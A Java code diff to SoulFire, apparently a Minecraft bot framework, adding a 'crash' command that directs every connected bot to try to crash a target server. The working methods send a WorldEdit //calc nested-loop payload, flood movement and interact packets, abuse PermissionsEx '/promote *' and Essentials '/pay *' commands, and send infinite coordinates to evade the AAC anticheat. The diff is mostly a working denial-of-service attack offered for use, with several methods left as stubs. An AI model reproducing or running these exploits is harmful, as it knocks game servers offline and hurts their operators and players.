@@ -18,6 +18,10 @@
 package net.pistonmaster.soulfire.server;
 
 import com.github.steveice10.mc.protocol.data.game.entity.RotationOrigin;
+import com.github.steveice10.mc.protocol.data.game.entity.player.Hand;
+import com.github.steveice10.mc.protocol.data.game.entity.player.InteractAction;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundInteractPacket;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundMovePlayerPosPacket;
 import com.mojang.brigadier.Command;
 import com.mojang.brigadier.CommandDispatcher;
 import com.mojang.brigadier.arguments.DoubleArgumentType;
@@ -296,6 +300,120 @@ public class ServerCommandManager {
 
             return Command.SINGLE_SUCCESS;
         }))));
+
+        dispatcher.register(literal("crash")
+                .then(argument("method", StringArgumentType.greedyString())
+                        .executes(help("Attempts to crash the server", c -> {
+                            var method = StringArgumentType.getString(c, "method");
+
+                            log.info("Attempting to crash the server with method: {}", method);
+
+                            return switch (method) {
+                                case "book" -> {
+                                    log.error("Book crash not implemented yet!");
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "calc" -> {
+                                    forEveryBot((bot) -> { // Work
+                                        bot.botControl().sendMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "fly" -> {
+                                    forEveryBot((bot) -> {
+                                        double botX = bot.sessionDataManager().clientEntity().x();
+                                        double botY = bot.sessionDataManager().clientEntity().y();
+                                        double botZ = bot.sessionDataManager().clientEntity().z();
+
+                                        for (int i = 0; i < 36; i++) {
+                                            botY += 9;
+                                            ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
+                                                    true,
+                                                    botX,
+                                                    botY,
+                                                    botZ
+                                            );
+                                            bot.sessionDataManager().sendPacket(packet);
+                                        }
+
+                                        for (int i = 0; i < 10000; i++) {
+                                            botX += 9;
+                                            ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
+                                                    true,
+                                                    botX,
+                                                    botY,
+                                                    botZ
+                                            );
+                                            bot.sessionDataManager().sendPacket(packet);
+                                        }
+
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "sleep" -> {
+                                    forEveryBot((bot) -> {
+                                        // TODO: 17/02/2024 check if there is a specific packet for leaving bed
+                                        ServerboundInteractPacket packet = new ServerboundInteractPacket(
+                                                bot.sessionDataManager().clientEntity().entityId(),
+                                                InteractAction.INTERACT,
+                                                Hand.MAIN_HAND,
+                                                false
+                                        );
+
+                                        for (int i = 0; i < 2000; i++) {
+                                            bot.sessionDataManager().sendPacket(packet);
+                                        }
+
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "permissionsex" -> { // Work
+                                    forEveryBot((bot) -> {
+                                        bot.botControl().sendMessage("/promote * a");
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "aac" -> {
+                                    // TODO: 17/02/2024 find old version of AAC crack to test
+                                    ServerboundMovePlayerPosPacket packet = new ServerboundMovePlayerPosPacket(
+                                            true,
+                                            Double.NEGATIVE_INFINITY,
+                                            Double.NEGATIVE_INFINITY,
+                                            Double.NEGATIVE_INFINITY
+                                    );
+                                    forEveryBot((bot) -> {
+                                        bot.sessionDataManager().sendPacket(packet);
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "essentials" -> {
+                                    forEveryBot((bot) -> {
+                                        bot.botControl().sendMessage("/pay * a a");
+                                        return Command.SINGLE_SUCCESS;
+                                    });
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "anvil" -> {
+                                    // try damage 3 and 16384
+                                    log.error("Anvil crash not implemented yet!");
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                case "chest" -> {
+                                    // create huge NBT data on chest and place the most possible chest to "crash" the area
+                                    log.error("Chest crash not implemented yet!");
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                                default -> {
+                                    log.error("Unknown crash method: {}", method);
+                                    yield Command.SINGLE_SUCCESS;
+                                }
+                            };
+                        }))));
 
         SoulFireAPI.postEvent(new DispatcherInitEvent(dispatcher));
     }
